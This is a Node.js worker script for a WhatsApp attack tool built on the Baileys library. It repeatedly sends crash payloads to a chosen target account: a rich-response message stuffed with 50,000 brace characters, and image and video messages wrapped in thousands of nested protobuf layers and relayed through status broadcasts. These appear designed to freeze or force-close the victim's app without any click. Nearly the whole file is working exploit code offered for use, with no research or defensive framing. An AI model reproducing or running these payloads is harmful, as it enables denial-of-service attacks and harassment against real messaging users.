// attackWorker.js
const { parentPort, workerData } = require('worker_threads');
const { proto, makeWASocket, useMultiFileAuthState, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const { ForceInvis } = require('./forceinvis');

// ==================== DEBUG LOGGER ====================
const debugLog = (msg) => {
    process.stderr.write(`[WORKER] ${msg}\n`);
};

const SILENT_LOGGER = pino({ level: 'silent' });

// ==================== MAIN RUN ====================
async function run() {
    const { authPath, attackType, targetJid, count } = workerData;
    
    debugLog(`=====================================`);
    debugLog(`Worker started`);
    debugLog(`  Attack Type: ${attackType}`);
    debugLog(`  Target: ${targetJid}`);
    debugLog(`  Count: ${count}`);
    debugLog(`  Auth Path: ${authPath}`);
    debugLog(`=====================================`);
    
    try {
        const { state } = await useMultiFileAuthState(authPath);
        debugLog(`Auth state loaded`);
        
        const sock = makeWASocket({
            logger: SILENT_LOGGER,
            printQRInTerminal: false,
            auth: {
                creds: state.creds,
                keys: makeCacheableSignalKeyStore(state.keys, SILENT_LOGGER),
            },
            browser: ['Mac OS', 'Safari', '10.15.7'],
            markOnlineOnConnect: false,
            syncFullHistory: false,
            shouldIgnoreJid: () => true,
            getMessage: async () => undefined,
        });
        
        debugLog(`Socket created, waiting for connection...`);
        
        await new Promise((resolve, reject) => {
            const timeout = setTimeout(() => {
                reject(new Error('Worker connect timeout (15s)'));
            }, 15000);
            
            sock.ev.on('connection.update', (update) => {
                if (update.connection === 'open') {
                    clearTimeout(timeout);
                    debugLog(`Connected successfully!`);
                    resolve();
                }
                if (update.connection === 'close') {
                    clearTimeout(timeout);
                    const reason = update.lastDisconnect?.error?.message || 'unknown';
                    reject(new Error(`Connection closed: ${reason}`));
                }
            });
        });
        
        let success = 0;
        let failed = 0;
        
        debugLog(`Starting attack loop (${count} iterations)...`);
        
        for (let i = 0; i < count; i++) {
            debugLog(`--- Iteration ${i + 1}/${count} ---`);
            try {
                // ✅ FORCEINVIS — alag handle karo (single call, loop nahi)
                if (attackType === 'forceinvis') {
                    debugLog(`[ForceInvis] Sending...`);
                    await ForceInvis(sock, targetJid);
                    success++;
                    debugLog(`[ForceInvis] Sent successfully`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: count, success, failed });
                }
                else if (attackType === 'ios') {
                    await ios(sock, targetJid);
                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: count, success, failed });
                }
                else if (attackType === 'forcevideo') {
                    await ForceVideo(sock, targetJid);
                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: count, success, failed });
                }
                else if (attackType === 'fcnoclick') {
                    await FcNoClick(sock, targetJid);
                    success++;
                    debugLog(`Iteration ${i + 1} SUCCESS (total: ${success} ok, ${failed} fail)`);
                    parentPort.postMessage({ type: 'progress', current: i + 1, total: count, success, failed });
                }
                else {
                    debugLog(`Unknown attack type: ${attackType}`);
                    throw new Error(`Unknown attack type: ${attackType}`);
                }
            } catch (err) {
                failed++;
                debugLog(`Iteration ${i + 1} FAILED: ${err.message}`);
                parentPort.postMessage({ type: 'progress', current: i + 1, total: count, success, failed, error: err.message });
            }
        }
        
        try { sock.end(undefined); } catch (e) {}
        
        debugLog(`=====================================`);
        debugLog(`Attack complete: ${success} success, ${failed} failed`);
        debugLog(`=====================================`);
        
        parentPort.postMessage({ type: 'done', success, failed, total: count });
        
    } catch (err) {
        debugLog(`FATAL ERROR: ${err.message}`);
        debugLog(`Stack: ${err.stack}`);
        parentPort.postMessage({ type: 'error', error: err.message });
    }
}

// ==================== iOS ====================
async function ios(sock, target) {
    debugLog(`[iOS] Building payload...`);
    const payload = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [],
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: [{
                                view_model: {
                                    primitive: {
                                        text: "x",
                                        inline_entities: ["{".repeat(50000)],
                                        __typename: "GenAIMarkdownTextUXPrimitive",
                                    },
                                    __typename: "GenAISingleLayoutViewModel",
                                }
                            }]
                        }))
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardOrigin: 4,
                        forwardedAiBotMessageInfo: { botJid: "0@bot" }
                    }
                }
            }
        }
    };
    debugLog(`[iOS] Sending relayMessage to ${target}`);
    await sock.relayMessage(target, payload, { isSecret: true });
    debugLog(`[iOS] Sent successfully`);
}

// ==================== ForceVideo ====================
async function ForceVideo(sock, target) {
    debugLog(`[ForceVideo] Building payload...`);
    const videoExfold = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
        fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
        mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
        directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
        fileLength: "10610",
        mediaKeyTimestamp: "1775044724"
    };

    const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) { buf.push((n & 0x7f) | 0x80); n >>>= 7; }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ videoMessage: videoExfold })
    ).finish();
    debugLog(`[ForceVideo] Base payload: ${basePayload.length} bytes`);

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) {
        debugLog(`[ForceVideo] No valid JIDs`);
        return;
    }

    var MAX_BATCH = 5;
    var DELAY_MS = 5000;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId = 'RayzethVideo' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                    debugLog(`[ForceVideo] Tag ${ti} success at depth ${depth}`);
                } catch (_) {}
            }

            if (!payload) {
                debugLog(`[ForceVideo] Tag ${ti} FAILED - no valid depth`);
                continue;
            }

            try {
                await sock.relayMessage('status@broadcast', payload, {
                    messageId: msgId,
                    statusJidList: chunk,
                    additionalNodes: [{
                        tag: 'meta',
                        attrs: {},
                        content: [{
                            tag: 'mentioned_users',
                            attrs: {},
                            content: chunk.map(function(jid) {
                                return { tag: 'to', attrs: { jid: jid }, content: [] };
                            })
                        }]
                    }]
                });
                debugLog(`[ForceVideo] Tag ${ti} relayed OK`);
            } catch (err) {
                debugLog(`[ForceVideo] Tag ${ti} relay FAILED: ${err.message}`);
            }
        }
    }
}

// ==================== FcNoClick ====================
async function FcNoClick(sock, target) {
    try {
        debugLog(`[FcNoClick] START for target: ${target}`);
        
        const IMG = {
            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
            directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
            mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
            fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
            fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
            fileLength: 20010,
            mediaKeyTimestamp: "1785637793",
            mimetype: "image/jpeg",
            height: 1600,
            width: 1200,
            jpegThumbnail: ""
        };

        const TAGS = [[0xBA, 0x03], [0xD2, 0x04], [0xAA, 0x02]];

        const encodeVarint = function (n) {
            const buf = [];
            while (n >= 0x80) {
                buf.push((n & 0x7f) | 0x80);
                n >>>= 7;
            }
            buf.push(n);
            return Buffer.from(buf);
        };

        const wrapLd = function (tag, data) {
            return Buffer.concat([
                Buffer.from(tag),
                encodeVarint(data.length),
                data
            ]);
        };

        let Payload;
        try {
            Payload = proto.Message.encode(
                proto.Message.fromObject({ imageMessage: IMG })
            ).finish();
            debugLog(`[FcNoClick] Payload built: ${Payload.length} bytes`);
        } catch (err) {
            debugLog(`[FcNoClick] ERROR building payload: ${err.message}`);
            throw err;
        }

        const inflate = function (tag, depth) {
            let buf = Payload;
            for (let i = 0; i < depth; i++) {
                buf = wrapLd(tag, wrapLd([0x0A], buf));
            }
            return buf;
        };

        const resolveJid = function (raw) {
            const s = String(raw || '').trim();
            if (!s) return '';
            if (s.includes('@')) return s;
            const digits = s.replace(/\D/g, '');
            return digits ? digits + '@s.whatsapp.net' : '';
        };

        const jids = (Array.isArray(target) ? target : [target])
            .map(resolveJid)
            .filter(function (j) { return j.length > 15; });

        debugLog(`[FcNoClick] JIDs: ${jids.join(', ') || 'NONE'}`);

        if (jids.length === 0) {
            debugLog(`[FcNoClick] No valid JIDs found`);
            return;
        }

        const MAX_BATCH = 1;
        const DELAY_MS = 1000;

        for (let offset = 0; offset < jids.length; offset += MAX_BATCH) {
            const batch = jids.slice(offset, offset + MAX_BATCH);
            const isFirst = offset === 0;

            if (!isFirst) {
                await new Promise(function (r) { setTimeout(r, DELAY_MS); });
            }

            const idx = Math.floor(offset / MAX_BATCH) + 1;
            const suffix = idx > 1 ? ('n' + idx) : 'n';
            const msg = 'NanasMuda' + Date.now().toString(36).toUpperCase() + suffix;

            for (let ti = 0; ti < TAGS.length; ti++) {
                const tag = TAGS[ti];
                let decoded = null;

                for (let depth = 5000; depth >= 2000 && !decoded; depth -= 400) {
                    try {
                        const candidate = proto.Message.decode(inflate(tag, depth));
                        proto.Message.encode(candidate).finish();
                        decoded = candidate;
                        debugLog(`[FcNoClick] Tag ${ti} success at depth ${depth}`);
                    } catch (_) {}
                }

                if (!decoded) {
                    debugLog(`[FcNoClick] Tag ${ti} FAILED - no valid depth`);
                    continue;
                }

                try {
                    await sock.relayMessage('status@broadcast', decoded, {
                        messageId: msg,
                        statusJidList: batch,
                        additionalNodes: [{
                            tag: 'meta',
                            attrs: {},
                            content: [{
                                tag: 'mentioned_users',
                                attrs: {},
                                content: batch.map(function (jid) {
                                    return { tag: 'to', attrs: { jid: jid }, content: [] };
                                })
                            }]
                        }]
                    });
                    debugLog(`[FcNoClick] Tag ${ti} relay OK`);
                } catch (err) {
                    debugLog(`[FcNoClick] Tag ${ti} relay FAILED: ${err.message}`);
                }
            }
        }
        
        debugLog(`[FcNoClick] COMPLETED for ${target}`);
    } catch (err) {
        debugLog(`[FcNoClick] FATAL: ${err.message}`);
        debugLog(`[FcNoClick] Stack: ${err.stack}`);
        throw err;
    }
}

// ==================== START ====================
run();